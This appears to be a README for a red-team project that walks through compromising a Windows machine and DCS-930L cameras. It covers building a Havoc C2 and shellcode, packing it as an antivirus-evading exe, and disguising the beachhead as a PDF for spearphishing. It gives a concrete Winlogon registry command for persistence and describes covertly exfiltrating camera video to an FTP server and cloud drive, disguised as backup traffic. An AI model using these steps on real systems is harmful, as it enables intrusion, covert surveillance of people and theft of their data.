
# How to Run

## Infrastructure
First you will need a network with at least 2 VMs and the DCS-930L camera

One VM should be Kali Linux. This will handle the C2 and payload generation/obfuscation.

The other VM should be a Windows machine.

The network should have the DCS-930L camera somewhere accessible to the Windows machine.

## Command and Control/Encryption

### Installation
To build the C2 framework, download the Havoc framework (git submodule in the repo), and follow the [build instructions](https://havocframework.com/docs/installation) there. 

To run it, have one terminal run the server `sudo ./havoc server --profile ./profiles/havoc.yaotl -v --debug`

And have another terminal run the client `./havoc client`. Login with default credentials `Neo` `password1234`.

### Attack
To attack, you first must have a listener. Go to views->listeners, then on the bottom pane click "Add". Create an HTTPS listener named anything.

Once a listener has been created, create a payload by going to the Attack tab. Here, you have several customizable options. To follow the demo, change Windows Exe to Windows Shellcode. Change the Sleep Technique to Ekko, and then click generate.

Once the shellcode is saved, it's time for encryption

### Encryption
#### Installation
To install the encryption tools, go to the Home-Grown-Red-Team submodule. Here, you need to follow the build instructions for the `Harriet` directory. All you need to do is run `bash setup.sh`
#### Generating an Exe
To generate an encrypted exe, run `bash Harriet.sh`, and choose FUD EXE (option 1). To follow along with the demo, you can then choose option 4, which is the ThreadPoolWait method. Follow the prompts on screen, and then generate your exe.

### Beachhead Delivery
Beachhead delivery can be however you want. For convenience purposes, we just dragged and dropped the beachhead in the demo. However in a real-world setting, you'd likely change the icon to be a PDF preview icon to match the extension, and then do a spearphishing attack with the beachhead.

## Downloading the implant
To download the full camera exploit to the target Windows machine, you're going to go back to the Havoc C2 dashboard and run the command `upload $PATH_TO_BEACHHEAD C:\any\path\on\windows`. This will upload the desired file to target machine.

### Running the implant
To run the implant, you can go to the Havoc C2 dashboard and run `powershell "C:\any\path\on\windows"` with the path to your implant filled out. This will cause the camera to continuously send video data to the C2 ftp server

## Persistence
To cause the C2 beachhead and the camera exploit to run on machine startup, run the following command in the C2 dashboard:

`powershell "Set-ItemProperty 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Shell' 'explorer.exe, C:\any\path\on\windows\BURSAR_BILL.pdf.scr, C;\Users\User\Downloads\BURSAR_BILL.pdf.scr' -Force"`

This will edit the registry to start up the beachhead and exploit on OS power on without it being in the "startup programs and apps" section of Windows.

## Workload
The workload scans the local network and add potential target webcami nto the target list. For each target device, we have two way of attacking and getting the data.

We use an exploit utilizing a bufferoverflow vulnerability to access the camera and run arbitrary code on it. As the camera comes with  FTP functionality, we changed the ftp settings to whatever we want and make it upload the photos to that ftp server. This ftp setting is synchronized with a remote server. This setting process is repeated every period of time.

The payload in the background will keep getting  the latest webcam frame and encoding them into a video. The videos are uploads to a cloud drive using rclone. The rclone config files are synchronized with a remote server each time it starts up. The data stream will look exact the same as the backup process that usually happens on personal computer.

